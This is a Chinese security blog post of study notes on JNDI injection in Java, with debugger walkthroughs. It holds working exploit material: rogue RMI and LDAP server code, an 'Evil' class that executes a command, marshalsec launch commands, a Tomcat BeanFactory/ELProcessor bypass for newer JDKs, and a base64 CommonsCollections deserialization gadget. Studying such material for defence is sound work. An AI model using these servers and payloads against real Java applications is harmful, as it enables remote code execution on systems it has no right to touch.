---
title: "JNDI 注入浅析"
date: 2022-12-25T13:55:58+08:00
lastmod: 2022-12-25T13:55:58+08:00
draft: false
author: "X1r0z"

tags: ['jndi']
categories: ['Java安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

JNDI 注入学习笔记

<!--more-->

## JNDI 介绍

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212242230264.png)

wiki 讲的比我好

[https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface)

[https://stackoverflow.com/questions/4365621/what-is-jndi-what-is-its-basic-use-when-is-it-used](https://stackoverflow.com/questions/4365621/what-is-jndi-what-is-its-basic-use-when-is-it-used)

[https://baike.baidu.com/item/JNDI/3792442](https://baike.baidu.com/item/JNDI/3792442)

JNDI 本质上就是以一种统一的方式来管理对象, 开发者也可以通过它提供的接口来接入自己的服务

一个简单的通过 JNDI 来访问 RMI 对象的 demo

RMIServer.java

```java
package com.example;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;
import java.util.Properties;

public class RMIServer {
    public static void main(String[] args) throws Exception{
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");

        InitialContext ctx = new InitialContext(env);
        LocateRegistry.createRegistry(1099);

        Hello hello = new HelloImpl();
        ctx.bind("hello", hello);

//         另一种方式, 无需设置 env
//        InitialContext ctx = new InitialContext();
//        LocateRegistry.createRegistry(1099);
//
//        Hello hello = new HelloImpl();
//        ctx.bind("rmi://127.0.0.1/hello", hello);
    }
}

interface Hello extends Remote {
    String world() throws RemoteException;
}

class HelloImpl extends UnicastRemoteObject implements Hello {
    protected HelloImpl() throws RemoteException {
    }

    @Override
    public String world() throws RemoteException {
        System.out.println("hello world");
        return "hello world";
    }
}
```

JNDIDemo.java

```java
package com.example;

import javax.naming.InitialContext;
import java.rmi.Remote;
import java.rmi.RemoteException;

public class JNDIDemo {
    public static void main(String[] args) throws Exception{
        InitialContext ctx = new InitialContext();
        Hello hello = (Hello) ctx.lookup("rmi://127.0.0.1:1099/hello");
        System.out.println(hello.world());
    }
}

interface Hello extends Remote {
    String world() throws RemoteException;
}
```

InitialContext 为初始环境上下文, 我们通过上下文来访问各种 JNDI 服务

它有如下几个常用方法

- bind(String name, Object obj)
- unbind(String name)
- rebind(String name, Object obj)
- list(Sring name):
- lookup(String name)

JNDI 注入的利用点就是这个 lookup 方法

## JNDI 注入

### 原理

造成 JNDI 注入的核心有两点

1. 动态协议转换
2. Reference 类

先看动态协议转换, 考虑如下代码

```java
package com.example;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.Properties;

public class JNDIDemo {
    public static void main(String[] args) throws Exception{
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");

        InitialContext ctx = new InitialContext(env);
        Hello hello = (Hello) ctx.lookup("rmi://192.168.100.1:1099/hello");
    }
}

interface Hello extends Remote {
    String world() throws RemoteException;
}

```

调试跟进 lookup 方法

![image-20221224225218089](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212242252122.png)

跟进 getURLOrDefaultInitCtx, 也就是动态协议转换实现的地方

![image-20221224225319906](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212242253011.png)

首先判断是否设置了 FactoryBuilder, 但其实这个跟我们设置的 `INITIAL_CONTEXT_FACTORY` 无关, 最终还是返回 null

然后进入到 getURLScheme

![image-20221224225757747](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212242257798.png)

截取 `://` 之前的内容作为协议名, 传入 NamingManager.getURLContext()

![image-20221224225833305](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212242258344.png)

可以看到, 如果获取不到 scheme 的话, 就会使用原来 env 中指定的 `INITIAL_CONTEXT_FACTORY`, 否则就会进行动态转换, 得到当前协议对应的 context factory

![image-20221224230135849](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212242301922.png)

跟进 getURLObject

![image-20221224230258124](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212242302171.png)

ResourceManager.getFactory() 会通过 context classloader 加载对应工厂类

然后调用工厂类的 getObjectInstance 方法来得到对应协议的 context

总的来说最终返回的 context 类型还是取决于 lookup 传入的 uri, 只有当 uri 被省略的时候才会使用 env 中指定的 `INITIAL_CONTEXT_FACTORY`

JNDI 默认支持动态转换的协议如下

| 协议名称             |   协议URL    | Context类                                             |
| -------------------- | :----------: | ----------------------------------------------------- |
| DNS协议              |    dns://    | com.sun.jndi.url.dns.dnsURLContext                    |
| RMI协议              |    rmi://    | com.sun.jndi.url.rmi.rmiURLContext                    |
| LDAP协议             |   ldap://    | com.sun.jndi.url.ldap.ldapURLContext                  |
| LDAP协议             |   ldaps://   | com.sun.jndi.url.ldaps.ldapsURLContextFactory         |
| IIOP对象请求代理协议 |   iiop://    | com.sun.jndi.url.iiop.iiopURLContext                  |
| IIOP对象请求代理协议 | iiopname://  | com.sun.jndi.url.iiopname.iiopnameURLContextFactory   |
| IIOP对象请求代理协议 | corbaname:// | com.sun.jndi.url.corbaname.corbanameURLContextFactory |

然后再看 Reference 类

Reference 类保存了远程对象的引用, 方便程序能够通过引用来获取到实际的远程对象

它重载的构造方法很多, 但常用的一般就这个

```java
Reference(String className, String factory, String factoryLocation)
```

![image-20221224231309711](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212242313749.png)

各个参数含义如下

- className: 工厂类加载的类名
- factory: 远程加载的工厂类类名
- factoryLocation: 远程加载工厂类的地址 (file http ftp 等协议)

客户端通过 lookup 得到 Reference 对象后, 会继续访问 factoryLocation 从而去加载某个 factory class, 然后调用该 factory 实例的 getObjectInstance 方法, 最终得到某个 class (由 className 指定)

Reference 可以被绑定在 RMI 或 LDAP 服务器上, 下文将分别讲解如何利用这两种方式来进行 JNDI 注入并远程加载恶意 class

### RMI + Reference

对于 RMI 协议, 我们可以将 Reference (或者套上一层 ReferenceWrapper) 绑定到 RMI Registry, 然后控制 lookup 参数指向恶意 RMI 服务器来加载恶意 class

RMIServer.java

```java
package com.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.util.Properties;

public class RMIServer {
    public static void main(String[] args) throws Exception{
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");

        InitialContext ctx = new InitialContext(env);
        LocateRegistry.createRegistry(1099);

        Reference reference = new Reference("test", "Evil", "http://127.0.0.1:8000/"); // url 末尾一定要加上 /
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        ctx.bind("test", reference);
    }
}
```

JNDIDemo.java

```java
package com.example;

import javax.naming.InitialContext;

public class JNDIDemo {
    public static void main(String[] args) throws Exception {
        InitialContext ctx = new InitialContext();
        ctx.lookup("rmi://127.0.0.1:1099/test");
    }
}
```

Evil.java, 注意 Evil 类需要继承自 ObjectFactory (当然不继承也没有影响, 只是会有报错信息)

```java
import java.io.IOException;
import java.util.Hashtable;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

public class Evil implements ObjectFactory{
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e){
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
```

![image-20221225110045135](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251100460.png)

调试流程

跟进 lookup 方法

![image-20221225110611529](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251106630.png)

首先获取 RegistryContext, 然后调用其 lookup 方法

![image-20221225110754741](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251107838.png)

调用 `RegistryImpl_Stub.lookup()`, 这部分跟 RMI 协议中 Stub 与 Skeleton 的通信流程相同

然后调用 decodeObject

![image-20221225111041991](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251110086.png)

判断是否属于 RemoteReference 或其子类的实例对象, 然后调用 `NamingManager.getObjectInstance()`

![image-20221225111316003](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251113138.png)

先通过 getObjectFactoryFromReference 得到 factory 实例, 然后调用它的 getObjectInstance 方法

跟进 getObjectFactoryFromReference 

![image-20221225111654447](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251116518.png)

首先调用 `helper.loadClass()`, 方法内部会从上下文中得到 AppClassLoader, 然后尝试从本地加载 factory 类

![image-20221225112043405](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251120455.png)

失败的话就会获取 codebase (也就是 factoryLocation), 再传入 helper 中使用 URLClassLoader 尝试加载

如果加载成功, 就会实例化 factory 类并强制转换为 ObjectFactory 类型, 这里也就是为什么我们最好要让 Evil 类继承 ObjectFactory

实战中可以利用 marshalsec 快速起一台恶意 RMI 服务器

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://127.0.0.1:8000/#Evil" 1099
```

![image-20221225112914521](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251129803.png)

### LDAP + Reference

LDAP 的 JNDI 注入与 RMI 基本一致

手工搭建服务器前需要添加如下依赖包

```xml
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>6.0.7</version>
</dependency>
```

LDAPServer.java

```java
package com.example;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;

public class LDAPServer{
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main (String[] args) {

        String url = "http://127.0.0.1:8000/#Evil";
        int port = 1389;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }
        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult (InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
//             Payload1: 利用 LDAP + Reference Factory
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
//             Payload2: 返回序列化 Gadget
//            try {
//                e.addAttribute("javaSerializedData", Base64.decode("..."));
//            } catch (ParseException exception) {
//                exception.printStackTrace();
//            }

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

JNDIDemo.java

```java
package com.example;

import javax.naming.InitialContext;

public class JNDIDemo {
    public static void main(String[] args) throws Exception {
        InitialContext ctx = new InitialContext();
        ctx.lookup("ldap://127.0.0.1:1389/test");
    }
}
```

![image-20221225120914587](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251209733.png)

调试流程

跟进 lookup 方法

![image-20221225121008114](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251210146.png)

![image-20221225121041400](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251210472.png)

![image-20221225121108032](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251211144.png)

![image-20221225121124690](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251211788.png)

![image-20221225121212458](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251212575.png)

同样会进行 decodeObject

![image-20221225121457288](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251214491.png)

LDAP 的通信过程中存在一个 `JAVA_ATTRIBUTES` 静态数组, 通过它来获取 attribute name 然后去 var0 中查询

部分 attribute name 对应的值如下

![image-20221225122343699](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251223735.png)

跟进 decodeReference

![image-20221225123024995](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251230169.png)

之后会回到原来的 LdapCtx, 调用 `DirectoryManager.getObjectInstance()`

![image-20221225123222342](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251232391.png)

![image-20221225123402003](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251234151.png)

![image-20221225123509246](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251235317.png)

这部分的流程跟之前的一样, 还是通过 URLClassLoader 去加载 codebase 中的 class

同样, 利用 marshalsec 也能快速起一台恶意 LDAP 服务器

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Evil" 1389
```

![image-20221225123909217](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251239378.png)

## 绕过高版本 JDK 限制

高版本 jdk 做出的一些限制

- **6u45 7u21 之后**: `java.rmi.server.useCodebaseOnly` 默认为 true, 禁止利用 RMI ClassLoader 加载远程类 (但是 Reference 加载远程类本质上利用的是 URLClassLoader, 所以该参数对于 JNDI 注入无任何影响 )
- **6u141, 7u131, 8u121 之后**: `com.sun.jndi.rmi.object.trustURLCodebase` 和 `com.sun.jndi.cosnaming.object.trustURLCodebase` 默认为 false, 禁止 RMI 和 CORBA 协议使用远程 codebase 来进行 JNDI 注入
- **6u211, 7u201, 8u191 之后**: `com.sun.jndi.ldap.object.trustURLCodebase` 默认为 false, 禁止 LDAP 协议使用远程 codebase 来进行 JNDI 注入

下面会列举一些绕过高版本 jdk 来进行 JNDI 注入的方法

### 利用本地 Class 作为 Factory

原理很简单, 既然禁止通过 codebase 远程加载, 那就去加载一个能够利用的本地 factory 然后执行 java 代码

但是这种利用方式受限于目标机器本地 classpath 中是否存在对应的 factory

理论上根据依赖的不同, 会有很多种利用方式, 这里以网上讨论最多的 `org.apache.naming.factory.BeanFactory` 和 `javax.el.ELProcessor` 为例

BeanFactory 来自 tomcat 的依赖包, 所以适用范围相对来说会广一些

ELProcessor 则是 java 自带的表达式解析引擎

添加如下依赖

```xml
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.0</version>
</dependency>
```

RMIServer.java

```java
package com.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.util.Properties;

public class RMIServer {
    public static void main(String[] args) throws Exception{
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");

        InitialContext ctx = new InitialContext(env);
        LocateRegistry.createRegistry(1099);

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        ctx.bind("test", referenceWrapper);
    }
}
```

调试流程

![image-20221225131252638](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251312750.png)

![image-20221225131337914](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251313027.png)

getObjectInstance 会判断当前的 ref 对象是否是 ResourceRef 的实例, 而 ResourceRef 为 Reference 的子类

所以这也就说明了为什么我们需要构造一个 ResourceRef 来加载 factory class, 而不是平时经常用到的 Reference

之后获取 classname, 即 `javax.el.ELProcessor` , 并调用 tcl 加载 class

![image-20221225131750935](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251317065.png)

BeanFactory 原本的作用是通过反射调用某个 BeanClass 的 setter 来赋值

但是我们能通过 forceString 参数将 setter 强制指定为 ELProcessor 中的 eval, 这样 `beanClass.getMethod()` 就变成了获取 eval 的 Method 对象

![image-20221225134659309](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251346381.png)

然后是一堆 do while 循环, 到 propName 为 `x` 的时候会跳出循环

最后得到该 RefAddr 对应的 content, 通过 `method.invoke()` 调用 ELProcessor 的 eval 方法来执行 java 代码

另外, 较新版本 tomcat 依赖包 (8.5.85) 已经禁用了 `forceString`, 报错如下

```
十二月 25, 2022 12:55:04 下午 org.apache.naming.factory.BeanFactory getObjectInstance
警告: The forceString option has been removed as a security hardening measure. Instead, if the setter method doesn't use String, a primitive or a primitive wrapper, the factory will look for a method with the same name as the setter that accepts a String and use that if found.
Exception in thread "main" javax.naming.NamingException: No set method found for property [x]
	at org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:206)
	at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:321)
	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:464)
	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:124)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at com.example.JNDIDemo.main(JNDIDemo.java:8)
```

所以还得考虑目标本地依赖包版本的问题

### 利用 LDAP 反序列化

原理就是在 LDAP 服务器返回查询结果的时候设置了 javaSerializedData 这个 attribute, 然后客户端就会调用 deserializeObject 进行反序列化

缺点在于需要知道目标机的本地 classpath 中是否存在相应的 gadget

![image-20221225124442223](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251244401.png)

![image-20221225124540809](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212251245889.png)

LDAPServer.java

```java
package com.example;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;

public class LDAPServer{
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main (String[] args) {

        String url = "http://127.0.0.1:8000/#Evil";
        int port = 1389;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }
        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult (InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
//             Payload1: 利用 LDAP + Reference Factory
//            e.addAttribute("javaCodeBase", cbstring);
//            e.addAttribute("objectClass", "javaNamingReference");
//            e.addAttribute("javaFactory", this.codebase.getRef());
//             Payload2: 返回序列化 Gadget
            try {
                e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AAhjYWxjLmV4ZXQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4"));
            } catch (ParseException exception) {
                exception.printStackTrace();
            }

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

调试流程跟 LDAP + Reference 基本一样, 就不写了

## 参考文章

[https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)

[https://townmacro.cn/2022/05/23/java-%E5%AE%89%E5%85%A8-jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/](https://townmacro.cn/2022/05/23/java-%E5%AE%89%E5%85%A8-jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/)

[https://kingx.me/Exploit-Java-Deserialization-with-RMI.html](https://kingx.me/Exploit-Java-Deserialization-with-RMI.html)

[https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html](https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html)

[https://y4er.com/posts/attack-java-jndi-rmi-ldap-2/](https://y4er.com/posts/attack-java-jndi-rmi-ldap-2/)
